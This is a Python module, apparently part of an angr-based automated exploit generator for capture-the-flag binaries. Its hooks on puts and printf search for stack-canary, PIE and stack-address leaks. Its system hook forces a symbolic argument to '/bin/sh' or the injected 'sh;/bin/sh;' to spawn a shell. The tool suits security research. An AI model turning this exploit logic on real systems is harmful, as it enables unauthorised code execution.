import angr.procedures.libc.printf
import angr.procedures.libc.puts
from angr import SimUnsatError
from claripy import If

from .utils import *
from .mod_leak import MitigateCanaryPuts, MitigatePIEPuts


class ReplaceGets(angr.SimProcedure):
    """
    angr default gets hook can only find unconstrained state in the same block.
    We need to write a hook to provide longer symbolic input.
    for add \n or not, we may return multi successors
    """

    def __init__(self, challenge):
        super().__init__()
        self.challenge = challenge

    def run(self, dst):
        log.success("Hit gets hook")

        new_state = self.state.copy()
        stdin = new_state.posix.get_fd(0)
        data_read, data_size = stdin.read_data(0x200)
        for i, byte in enumerate(data_read.chop(8)):
            new_state.solver.add(If(i + 1 != data_size, byte != b'\n', byte == b'\n'))
            # Or(i + 2 == 0x1000, stdin.eof(), byte == b'\n')
        new_state.memory.store(dst + data_size, b'\0')

        stdin = self.state.posix.get_fd(0)
        data_read, data_size = stdin.read_data(0x200)
        self.state.memory.store(dst, data_read, size=data_size)
        reorder_successors(self, [self.state, new_state])


class ReplaceRead(angr.SimProcedure):
    """
    read is not necessary to read full, but here we treat it as full read, so many dumps are adapted
    we might return multiple successors directly
    """
    IS_FUNCTION = True

    def __init__(self, challenge):
        super().__init__()
        self.challenge = challenge

    def run(self, fd, dst, read_length):
        sim_fd = self.state.posix.get_fd(fd)
        if sim_fd is None:
            return -1
        return sim_fd.read(dst, read_length)


class ReplaceAlarm(angr.SimProcedure):
    def run(self, fd):
        return 1


class ReplaceSetBuf(angr.SimProcedure):
    def run(self, stream, buf):
        return


class ReplacePuts(angr.procedures.libc.puts.puts):
    def __init__(self, challenge):
        super().__init__()
        self.challenge = challenge
        self.need_leak = self.challenge.protection['Canary'] or self.challenge.protection['PIE']

    def run(self, buf):
        if not self.need_leak:
            return  # we do not need any output
        binary = self.state.globals['binary']
        bp = self.state.solver.eval(self.state.regs.bp)
        if not bp:
            log.warning("Function does not use bp, perhaps -fomit-frame-pointer enabled?")
            return
        sp = self.state.solver.eval(self.state.regs.sp)
        buf_addr = self.state.solver.eval(buf)
        if sp < buf_addr < bp:
            ab = self.challenge.target_property['arch_bytes']
            stack_frame_length = bp - sp
            mid = get_max_str_len(self.state, buf_addr, stack_frame_length * 2, True)
            log.info(f"puts arg is in stack frame, checking if it can leak data. "
                     f"current stack frame length: {hex(stack_frame_length)}")

            log.info(f"puts len >= {mid}")
            ret_addr_offset = bp - buf_addr + ab
            # todo: canary may not adjust with bp, we can get offset from angr
            canary_offset = bp - buf_addr - (7 if ab == 8 else 3)

            bool_ret_addr = mid >= ret_addr_offset
            bool_canary = mid >= canary_offset  # 8 + 7 for 64bit, 4 + 3 for 32bit

            new_states = []
            if bool_canary and binary.challenge.protection['Canary'] and not binary.io_seg_addr.get('Canary'):
                log.success("puts can leak canary, try add branch...")
                new_state = self.state.copy()
                payload_patten = generate_leak_string(new_state, canary_offset, buf_addr, binary)
                if payload_patten:
                    new_binary = binary.__copy__()
                    new_state.globals['binary'] = new_binary
                    payload = dump_payload(new_state, False)
                    payload = payload[:payload.index(payload_patten) + len(payload_patten)]
                    leak_canary = MitigateCanaryPuts(payload, payload_patten, len(self.state.posix.stdin.content))
                    if leak_canary.run(new_state, None, None):
                        new_binary.leak_path.append(leak_canary)
                        new_states.append(new_state)
            # it is better if we judge leak belongs to text or libc
            # make sure we do not trigger a smash stack (although we may leak canary in next stack frame)
            elif bool_ret_addr and binary.challenge.protection['PIE'] and not binary.io_seg_addr.get('text'):
                log.success("puts can leak address, try add branch...")
                new_state = self.state.copy()
                payload_patten = generate_leak_string(new_state, ret_addr_offset, buf_addr, binary)
                if payload_patten:
                    new_binary = binary.__copy__()
                    new_state.globals['binary'] = new_binary
                    payload = dump_payload(new_state, False)
                    payload = payload[:payload.index(payload_patten) + len(payload_patten)]
                    leak_pie = MitigatePIEPuts(payload, payload_patten, len(self.state.posix.stdin.content))
                    if leak_pie.run(new_state, None, None):
                        new_binary.leak_path.append(leak_pie)
                        new_states.append(new_state)
            reorder_successors(self, new_states)


class ReplaceLibcStartMain(angr.SimProcedure):
    def run(self, main, argc, argv, init, fini):
        if self.state.globals['binary'].challenge.target_property['arch_bytes'] == 4:
            main = self.state.mem[self.state.regs.sp:].int.resolved
        self.call(main, (0, 0, 0), 'after_main')

    def after_main(self, _, __, ___, ____, ______):
        self.exit(0)


class ServerMain64LibPWNAbleHarness(angr.SimProcedure):
    def run(self, argc, argv, _, __, main_addr):
        self.call(main_addr, (argc, argv, 0), 'after_main')

    def after_main(self):
        self.exit(0)


class ServerMain32LibPWNAbleHarness(angr.SimProcedure):
    def run(self, argc, argv, _, __, ___, main_addr):
        self.call(main_addr, (argc, argv, 0), 'after_main')

    def after_main(self):
        self.exit(0)


class ReplaceCxaAllocateException(angr.SimProcedure):
    def __init__(self):
        super().__init__()

    def run(self, err_no):
        binary = self.state.globals['binary']
        try:
            log.warning("Trace into exception is not support")
            log.info(f"Try raise exception use payload {self.state.posix.dumps(0)}")
            if self.state.posix.dumps(0) != b"":
                binary.get_flag(self.state, self.state.posix.dumps(0))
        except SimUnsatError:
            pass


class ReplaceSystem(angr.SimProcedure):
    def run(self, cmd):  # get_max_str_len may be slow
        var_loc = self.state.solver.eval(cmd)
        print(hex(var_loc))
        symbolic_list = [self.state.memory.load(var_loc + x, 1).symbolic
                         for x in range(get_max_str_len(self.state, var_loc, binary_search=True))]
        print(symbolic_list)
        if sum(symbolic_list) > 10:
            log.success("Found symbolic buffer passed to system!")
            position, greatest_count = get_max_successive_symbolic_byte(symbolic_list)
            new_state = self.state.copy()
            log.success(f"Found symbolic buffer at position {position} of length {greatest_count}")
            if position == 0 and greatest_count > 7:
                new_state.add_constraints(new_state.memory.load(var_loc + position, 8) == b'/bin/sh\x00')
            elif greatest_count > 10:
                new_state.add_constraints(new_state.memory.load(var_loc + position, 11) == b'sh;/bin/sh;')
            binary = new_state.globals['binary']
            try:
                log.info(f"Try overwrite system argument with {new_state.posix.dumps(0)}")
                binary.get_flag(new_state, dump_payload(new_state, False))
            except SimUnsatError:
                pass


class ReplacePrintf(angr.procedures.libc.printf.printf):
    def __init__(self, challenge):
        super().__init__()
        self.challenge = challenge
        self.ab = self.challenge.target_property['arch_bytes']
        self.need_leak = self.challenge.protection['Canary'] or self.challenge.protection['PIE']
        self.need_stack = not self.challenge.protection['NX']
        self.leak_offset = {}

    def run(self, fmt):

        var_loc = self.state.solver.eval(self.arguments[0])
        if len(list(self.state.memory.addrs_for_name(var_loc))) == 0:
            return super().run(fmt)

        symbolic_list = [self.state.memory.load(var_loc + x, 1).symbolic
                         for x in range(get_max_str_len(self.state, var_loc, binary_search=True))]
        if sum(symbolic_list) < 3:
            return super().run(fmt)

        # from zeratools
        position, greatest_count = get_max_successive_symbolic_byte(symbolic_list)
        log.success(f"Found symbolic buffer at position {position} of length {greatest_count}")

        ab = self.ab
        leak_canary = True
        leak_stack = True
        # leak_libc = True
        # leak_text = True
        if self.need_leak:
            for stack_var in range(2, 30):
                var = self.state.solver.eval(self.state.memory.load(self.state.regs.sp + stack_var * ab, ab))
                binary = self.state.globals['binary']
                if (self.challenge.protection['Canary'] and not binary.io_seg_addr.get('Canary')
                        and leak_canary):
                    if var == CANARY:
                        leak_canary = False
                        log.success("printf can leak Canary!")
                        self.leak_offset['Canary'] = {'index': stack_var - 1, 'offset': {'Canary': 0}}
                if self.need_stack and not binary.io_seg_addr.get('Stack') and leak_stack:
                    if abs(var - self.state.solver.eval(self.state.regs.bp)) < 0x1000:
                        leak_stack = False
                        log.success("printf can leak stack address!")
                        # we can calculate the offset of fmt_str and ret_addr directly, but not implemented yet
                        fmt_str_addr = self.state.solver.eval(self.state.memory.load(self.state.regs.sp + ab, ab))
                        ret_addr = self.state.solver.eval(self.state.memory.load(self.state.regs.bp + ab, ab))
                        self.leak_offset['Stack'] = {
                            'index': stack_var - 1,
                            'offset': {
                                'fmt_str': var - fmt_str_addr,
                                'ret_addr': var - ret_addr
                            }
                        }
                    # if LEAK_COMMON_HEX in hex(var).encode():
                    #     if not self.challenge.segment_address.get('libc') and leak_libc:
                # judge we can leak libc, text, stack or other information
        super().run(fmt)
